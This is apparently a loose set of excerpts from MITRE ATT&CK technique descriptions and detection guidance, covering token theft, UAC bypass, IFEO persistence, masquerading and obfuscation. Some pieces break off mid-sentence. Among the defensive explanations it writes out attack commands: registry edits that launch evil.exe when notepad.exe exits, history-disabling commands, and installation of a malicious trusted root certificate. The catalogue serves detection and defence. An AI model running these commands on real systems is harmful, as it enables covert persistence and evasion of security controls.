        Web shells may serve as [Redundant Access](https://attack.mitre.org/techniques/T1108) or as a persistence mechanism in case an adversary's primary access methods are detected and removed.

        Monitor for changes to Registry entries associated with Winlogon that do not correlate with known software, patch cycles, etc. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current Winlogon helper values. (Citation: TechNet Autoruns)  New DLLs written to System32 that do not correlate with known good software or patching may also be suspicious.

        Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.

        Microsoft Command-line Logging)\n\nIf an adversary is using a payload that
        calls the Windows token APIs directly, analysts can detect token manipulation
        only through careful analysis of user network activity, examination of running
        processes, and correlation with other endpoint and network behavior. \n\nThere
        are many Windows API calls a payload can take advantage of to manipulate access
        tokens (e.g., <code>LogonUser</code> (Citation: Microsoft LogonUser), <code>DuplicateTokenEx</code>
        (Citation: Microsoft DuplicateTokenEx), and <code>ImpersonateLoggedOnUser</code>
        (Citation: Microsoft ImpersonateLoggedOnUser)). Please see the referenced
        Windows API pages for more information.\n\nQuery systems for process and thread

      description: "Windows uses access tokens to determine the ownership of a running
        process. A user can manipulate access tokens to make a running process appear
        as though it belongs to someone other than the user that started the process.
        When this occurs, the process also takes on the security context associated
        with the new token. For example, Microsoft promotes the use of access tokens
        as a security best practice. Administrators should log in as a standard user
        but run their tools with administrator privileges using the built-in access
        token manipulation command <code>runas</code>. (Citation: Microsoft runas)\n
        \ \nAdversaries may use access tokens to operate under a different user or
        system security context to perform actions and evade detection. An adversary
        can use built-in Windows API functions to copy access tokens from existing
        processes; this is known as token stealing. An adversary must already be in
        a privileged user context (i.e. administrator) to steal a token. However,
        adversaries commonly use token stealing to elevate their security context
        from the administrator level to the SYSTEM level. An adversary can use a token
        to authenticate to a remote system as the account for that token if the account
        has appropriate permissions on the remote system. (Citation: Pentestlab Token
        Manipulation)\n\nAccess tokens can be leveraged by adversaries through three
        methods: (Citation: BlackHat Atkinson Winchester Token Manipulation)\n\n**Token
        Impersonation/Theft** - An adversary creates a new access token that duplicates
        an existing token using <code>DuplicateToken(Ex)</code>. The token can then
        be used with <code>ImpersonateLoggedOnUser</code> to allow the calling thread
        to impersonate a logged on user's security context, or with <code>SetThreadToken</code>
        to assign the impersonated token to a thread. This is useful for when the
        target user has a non-network logon session on the system.\n\n**Create Process
        with a Token** - An adversary creates a new access token with <code>DuplicateToken(Ex)</code>
        and uses it with <code>CreateProcessWithTokenW</code> to create a new process
        running under the security context of the impersonated user. This is useful
        for creating a new process under the security context of a different user.\n\n**Make
        and Impersonate Token** - An adversary has a username and password but the
        user is not logged onto the system. The adversary can then create a logon
        session for the user using the <code>LogonUser</code> function. The function
        will return a copy of the new session's access token and the adversary can
        use <code>SetThreadToken</code> to assign the token to a thread.\n\nAny standard
        user can use the <code>runas</code> command, and the Windows API functions,
        to create impersonation tokens; it does not require access to an administrator
        account.\n\nMetasploit’s Meterpreter payload allows arbitrary token manipulation
        and uses token impersonation to escalate privileges. (Citation: Metasploit
        access token)  The Cobalt Strike beacon payload allows arbitrary token impersonation
        and can also create tokens. (Citation: Cobalt Strike Access Token)"

        Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM). (Citation: Microsoft COM) (Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.

        The interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1086)  (Citation: Microsoft BITS) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool. (Citation: Microsoft BITSAdmin)

        Adversaries may abuse BITS to download, execute, and even clean up after running malicious code. BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. (Citation: CTU BITS Malware June 2016) (Citation: Mondok Windows PiggyBack BITS May 2007) (Citation: Symantec BITS May 2007) BITS enabled execution may also allow Persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots). (Citation: PaloAlto UBoatRAT Nov 2017) (Citation: CTU BITS Malware June 2016)

        BITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048). (Citation: CTU BITS Malware June 2016)

        There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of [Process Injection](https://attack.mitre.org/techniques/T1055) and unusual loaded DLLs through [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038), which indicate attempts to gain access to higher privileged processes.

        Some UAC bypass methods rely on modifying specific, user-accessible Registry settings. For example:

        * The <code>eventvwr.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\Software\Classes\mscfile\shell\open\command</code> Registry key. (Citation: enigma0x3 Fileless UAC Bypass)
        * The <code>sdclt.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe</code> and <code>[HKEY_CURRENT_USER]\Software\Classes\exefile\shell\runas\command\isolatedCommand</code> Registry keys. (Citation: enigma0x3 sdclt app paths) (Citation: enigma0x3 sdclt bypass)

        Analysts should monitor these Registry settings for unauthorized changes.

        Windows User Account Control (UAC) allows a program to elevate its privileges to perform a task under administrator-level permissions by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. (Citation: TechNet How UAC Works)

        If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs are allowed to elevate privileges or execute some elevated COM objects without prompting the user through the UAC notification box. (Citation: TechNet Inside UAC) (Citation: MSDN COM Elevation) An example of this is use of rundll32.exe to load a specifically crafted DLL which loads an auto-elevated COM object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user. (Citation: Davidson Windows) Adversaries can use these techniques to elevate privileges to administrator if the target process is unprotected.

        Many methods have been discovered to bypass UAC. The Github readme page for UACMe contains an extensive list of methods (Citation: Github UACMe) that have been discovered and implemented within UACMe, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:

        * <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script. (Citation: enigma0x3 Fileless UAC Bypass) (Citation: Fortinet Fareit)

        Another bypass is possible through some Lateral Movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on lateral systems and default to high integrity.

        * To detect loading and execution of local/remote payloads - Event 1 (Process creation) where ParentImage contains CMSTP.exe and/or Event 3 (Network connection) where Image contains CMSTP.exe and DestinationIP is external.
        * To detect [Bypass User Account Control](https://attack.mitre.org/techniques/T1088) via an auto-elevated COM interface - Event 10 (ProcessAccess) where CallTrace contains CMLUA.dll and/or Event 12 or 13 (RegistryEvent) where TargetObject contains CMMGR32.exe. Also monitor for events, such as the creation of processes (Sysmon Event 1), that involve auto-elevated CMSTP COM interfaces such as CMSTPLUA (3E5FC7F9-9A51-4367-9063-A120244FBEC7) and CMLUAUTIL (3E000D72-A845-4CD9-BD83-80C07C3B881F).

        be accessed in a few different ways. While logged in, this command history

        this is that it allows users to go back to commands they've used before in
        different sessions. Since everything typed on the command-line is saved, passwords
        passed in on the command line are also saved. Adversaries can abuse this by
        searching these files for cleartext passwords. Additionally, adversaries can
        use a variety of methods to prevent their own commands from appear in these
        logs such as <code>unset HISTFILE</code>, <code>export HISTFILESIZE=0</code>,

        Adversaries may use an existing, legitimate external Web service as a means for relaying commands to a compromised system.

        These commands may also include pointers to command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.

        Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.

        Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).

        DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a Domain Controller (DC). (Citation: DCShadow Blog) (Citation: BlueHat DCShadow Jan 2018) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.

        Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)

        This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1178) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence.

        Detecting the action of deobfuscating or decoding files or information may be difficult depending on the implementation. If the functionality is contained within malware and uses the Windows API, then attempting to detect malicious behavior before or after the action may yield better results than attempting to perform analysis on loaded libraries or API calls. If scripts are used, then collecting the scripts for analysis may be necessary. Perform process and command-line monitoring to detect potentially malicious behavior related to scripts and system utilities such as [certutil](https://attack.mitre.org/software/S0160).

        Monitor the execution file paths and command-line arguments for common archive file applications and extensions, such as those for Zip and RAR archive tools, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior.

        Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware, [Scripting](https://attack.mitre.org/techniques/T1064), [PowerShell](https://attack.mitre.org/techniques/T1086), or by using utilities present on the system.

        One such example is use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia)

        Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016)

        Payloads may be compressed, archived, or encrypted in order to avoid detection.  These payloads may be used with [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as Javascript.

      x_mitre_detection: It may be uncommon for events related to benign command-line
        functions such as DEL or third-party utilities or tools to be found in an
        environment, depending on the user base and how systems are typically used.
        Monitoring for command-line deletion functions to correlate with binaries
        or other files that an adversary may drop and remove may lead to detection
        of malicious activity. Another good practice is monitoring for known deletion
        and secure deletion tools that are not already on systems within an enterprise
        network that an adversary could introduce. Some monitoring tools may collect
        command-line arguments, but may not capture DEL commands since DEL is a native
        function within cmd.exe.

        Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces behind as to what was done within a network and how. Adversaries may remove these files over the course of an intrusion to keep their footprint low or remove them at the end as part of the post-intrusion cleanup process.

        There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native [cmd](https://attack.mitre.org/software/S0106) functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools.

        File permissions are commonly managed by discretionary access control lists (DACLs) specified by the file owner. File DACL implementation may vary by platform, but generally explicitly designate which users/groups can perform which actions (ex: read, write, execute, etc.). (Citation: Microsoft DACL May 2018) (Citation: Microsoft File Rights May 2018) (Citation: Unix File Permissions)

        Adversaries may modify file permissions/attributes to evade intended DACLs. (Citation: Hybrid Analysis Icacls1 June 2018) (Citation: Hybrid Analysis Icacls2 May 2018) Modifications may include changing specific access rights, which may require taking ownership of a file and/or elevated permissions such as Administrator/root depending on the file's existing permissions to enable malicious activity such as modifying, replacing, or deleting specific files. Specific file modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1015), [Logon Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files.

      description: "In macOS and OS X, when applications or programs are downloaded
        from the internet, there is a special attribute set on the file called <code>com.apple.quarantine</code>.
        This attribute is read by Apple's Gatekeeper defense program at execution
        time and provides a prompt to the user to allow or deny execution. \n\nApps
        loaded onto the system from USB flash drive, optical disk, external hard drive,
        or even from a drive shared over the local network won’t set this flag. Additionally,
        other utilities or events like drive-by downloads don’t necessarily set it
        either. This completely bypasses the built-in Gatekeeper check. (Citation:
        Methods of Mac Malware Persistence) The presence of the quarantine flag can
        be checked by the xattr command <code>xattr /path/to/MyApp.app</code> for
        <code>com.apple.quarantine</code>. Similarly, given sudo access or elevated
        permission, this attribute can be removed with xattr as well, <code>sudo xattr
        -r -d com.apple.quarantine /path/to/MyApp.app</code>. (Citation: Clearing
        quarantine attribute) (Citation: OceanLotus for OS X)\n \nIn typical operation,
        a file will be downloaded from the internet and given a quarantine flag before
        being saved to disk. When the user tries to open the file or application,
        macOS’s gatekeeper will step in and check for the presence of this flag. If
        it exists, then macOS will then prompt the user to confirmation that they
        want to run the program and will even provide the URL where the application
        came from. However, this is all based on the file being downloaded from a
        quarantine-savvy application. (Citation: Bypassing Gatekeeper)"

        the <code>~/.bash_history</code> file when a user logs out. This setting can
        be configured to ignore commands that start with a space by simply setting
        it to "ignorespace". <code>HISTCONTROL</code> can also be set to ignore duplicate
        commands by setting it to "ignoredups". In some Linux systems, this is set
        by default to "ignoreboth" which covers both of the previous examples. This
        means that “ ls” will not be saved, but “ls” would be saved by history. <code>HISTCONTROL</code>
        does not exist by default on macOS, but can be set by the user and will be
        respected. Adversaries can use this to operate without leaving traces by simply
        prepending a space to all of their terminal commands.

      description: |-
        To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls –a</code> for Linux and macOS).

        Adversaries can use this to their advantage to hide files and folders anywhere on the system for persistence and evading a typical user or system analysis that does not incorporate investigation of hidden files.

        ### Windows

        Users can mark specific files as hidden by using the attrib.exe binary. Simply do <code>attrib +h filename</code> to mark a file or folder as hidden. Similarly, the “+s” marks a file as a system file and the “+r” flag marks the file as read only. Like most windows binaries, the attrib.exe binary provides the ability to apply these changes recursively “/S”.

        ### Linux/Mac

        Users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folder that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable. For command line usages, there is typically a flag to see all files (including hidden ones). To view these files in the Finder Application, the following command must be executed: <code>defaults write com.apple.finder AppleShowAllFiles YES</code>, and then relaunch the Finder Application.

        ### Mac

        Files on macOS can be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker).
        Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.

        Image File Execution Options (IFEO) enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., “C:\dbg\ntsd.exe -g  notepad.exe”). (Citation: Microsoft Dev Blog IFEO Mar 2010)

        IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable></code> where <code><executable></code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)

        IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IEFO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)

        An example where the evil.exe process is started when notepad.exe exits: (Citation: Oddvar Moe IFEO APR 2018)

        * <code>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512</code>
        * <code>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1</code>
        * <code>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"</code>

        Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may be abused to obtain persistence and privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Endgame Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous invocation.

        Malware may also use IFEO for Defense Evasion by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)

        Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.

        Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)

        Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)

        Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)

        In macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)

        InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) InstallUtil is located in the .NET directories on a Windows system: <code>C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe</code> and <code>C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe</code>. InstallUtil.exe is digitally signed by Microsoft.

        Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil may also be used to bypass process whitelisting through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>.

        Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.

        If file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Endgame Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)

        For RTLO, detection methods should include looking for common formats of RTLO characters within filenames such as "\u202E", "[U+202E]", and "%E2%80%AE". Defenders should also check their analysis tools to ensure they do not interpret the RTLO character and instead print the true name of the a file containing it.

      description: |-
        Masquerading occurs when the name or location of an executable, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. Several different variations of this technique have been observed.

        One variant is for an executable to be placed in a commonly trusted directory or given the name of a legitimate, trusted program. Alternatively, the filename given may be a close approximation of legitimate programs or something innocuous. An example of this is when a common system utility or program is moved and renamed to avoid detection based on its usage.(Citation: FireEye APT10 Sept 2018) This is done to bypass tools that trust executables by relying on file name or path, as well as to deceive defenders and system administrators into thinking a file is benign by associating the name with something that is thought to be legitimate.

        A third variant uses the right-to-left override (RTLO or RLO) character (U+202E) as a means of tricking a user into executing what they think is a benign file type but is actually executable code. RTLO is a non-printing character that causes the text that follows it to be displayed in reverse.(Citation: Infosecinstitute RTLO Technique) For example, a Windows screensaver file named <code>March 25 \u202Excod.scr</code> will display as <code>March 25 rcs.docx</code>. A JavaScript file named <code>photo_high_re\u202Egnp.js</code> will be displayed as <code>photo_high_resj.png</code>. A common use of this technique is with spearphishing attachments since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.(Citation: Trend Micro PLEAD RTLO)(Citation: Kaspersky RTLO Cyber Crime) RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default. 

        ### Windows
        In another variation of this technique, an adversary may use a renamed copy of a legitimate utility, such as rundll32.exe. (Citation: Endgame Masquerade Ball) An alternative case occurs when a legitimate utility is moved to a different directory and also renamed to avoid detections based on system utilities executing from non-standard paths. (Citation: F-Secure CozyDuke)

        An example of abuse of trusted locations in Windows would be the <code>C:\Windows\System32</code> directory. Examples of trusted binary names that can be given to malicious binares include "explorer.exe" and "svchost.exe".

        ### Linux
        Another variation of this technique includes malicious binaries changing the name of their running process to that of a trusted or benign process, after they have been launched as opposed to before. (Citation: Remaiten)

        An example of abuse of trusted locations in Linux  would be the <code>/bin</code> directory. Examples of trusted binary names that can be given to malicious binares include "rsyncd" and "dbus-inotifier". (Citation: Fysbis Palo Alto Analysis)  (Citation: Fysbis Dr Web Analysis)

        Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Consider enabling Registry Auditing on specific keys to produce an alertable event (Event ID 4657) whenever a value is changed (though this may not trigger when values are created with Reghide or other evasive methods). (Citation: Microsoft 4657 APR 2017) Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.

        Monitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1086), which may require additional logging features to be configured in the operating system to collect necessary information for analysis.

        Monitor for processes, command-line arguments, and API calls associated with concealing Registry keys, such as Reghide. (Citation: Microsoft Reghide NOV 2006) Inspect and cleanup malicious hidden Registry entries using Native Windows API calls and/or tools such as Autoruns (Citation: SpectorOps Hiding Reg Jul 2017) and RegDelNull (Citation: Microsoft RegDelNull July 2016).

        Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in Persistence and Execution.

        Access to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API (see examples).

        Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to establish Persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)

        The Registry of a remote system may be modified to aid in execution of files as part of Lateral Movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) for RPC communication.

        Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the binary being executed.

        Monitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious.

        Forensic techniques exist to identify information stored in NTFS EA. (Citation: Journey into IR ZeroAccess NTFS EA) Monitor calls to the ZwSetEaFile and ZwQueryEaFile Windows API functions as well as binaries used to interact with EA, (Citation: Oddvar Moe ADS1 Jan 2018) (Citation: Oddvar Moe ADS2 Apr 2018) and consider regularly scanning for the presence of modified information. (Citation: SpectorOps Host-Based Jul 2017)

        There are many ways to create and interact with ADSs using Windows utilities. Monitor for operations (execution, copies, etc.) with file names that contain colons. This syntax (ex: <code>file.ext:ads[.ext]</code>) is commonly associated with ADSs. (Citation: Microsoft ADS Mar 2014) (Citation: Oddvar Moe ADS1 Jan 2018) (Citation: Oddvar Moe ADS2 Apr 2018) For a more exhaustive list of utilities that can be used to execute and create ADSs, see https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f.

        The Streams tool of Sysinternals can be used to uncover files with ADSs. The <code>dir /r</code> command can also be used to display ADSs. (Citation: Symantec ADS May 2009) Many PowerShell commands (such as Get-Item, Set-Item, Remove-Item, and Get-ChildItem) can also accept a <code>-stream</code> parameter to interact with ADSs.

        Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).

        Flag and analyze commands containing indicators of obfuscation and known suspicious syntax such as uninterpreted escape characters like '''^''' and '''"'''. Windows' Sysmon and Event ID 4688 displays command-line arguments for processes. Deobfuscation tools can be used to detect these indicators in files/payloads. (Citation: GitHub Revoke-Obfuscation) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: GitHub Office-Crackros Aug 2016)

        Obfuscation used in payloads for Initial Access can be detected at the network. Use network intrusion detection systems and email gateway filtering to identify compressed and encrypted attachments and scripts. Some email attachment detonation systems can open compressed and encrypted attachments. Payloads delivered over an encrypted connection from a website require encrypted network traffic inspection.

        Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.

        Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as Javascript.

        Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)

        Adversaries may also obfuscate commands executed from payloads or directly via a [Command-Line Interface](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and whitelisting mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: PaloAlto EncodedCommand March 2017)

        Another example of obfuscation is through the use of steganography, a technique of hiding messages or code in images, audio tracks, video clips, or text files. One of the first known and reported adversaries that used steganography activity surrounding [Invoke-PSImage](https://attack.mitre.org/software/S0231). The Duqu malware encrypted the gathered information from a victim's system and hid it into an image followed by exfiltrating the image to a C2 server. (Citation: Wikipedia Duqu) By the end of 2017, an adversary group used [Invoke-PSImage](https://attack.mitre.org/software/S0231) to hide PowerShell commands in an image file (png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.

        File system monitoring can determine if plist files are being modified. Users should not have permission to modify these in most cases. Some software tools like "Knock Knock" can detect persistence mechanisms and point to the specific files that are being referenced. This can be helpful to see what is actually being executed.

        Monitor process execution for abnormal process execution resulting from modified plist files. Monitor utilities used to modify plist files or that take a plist file as an argument, which may indicate suspicious activity.

        Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. API calls such as CreateRemoteThread, SuspendThread/SetThreadContext/ResumeThread, QueueUserAPC/NtQueueApcThread, and those that can be used to modify memory within another process, such as WriteProcessMemory, may be used for this technique. (Citation: Endgame Process Injection July 2017)

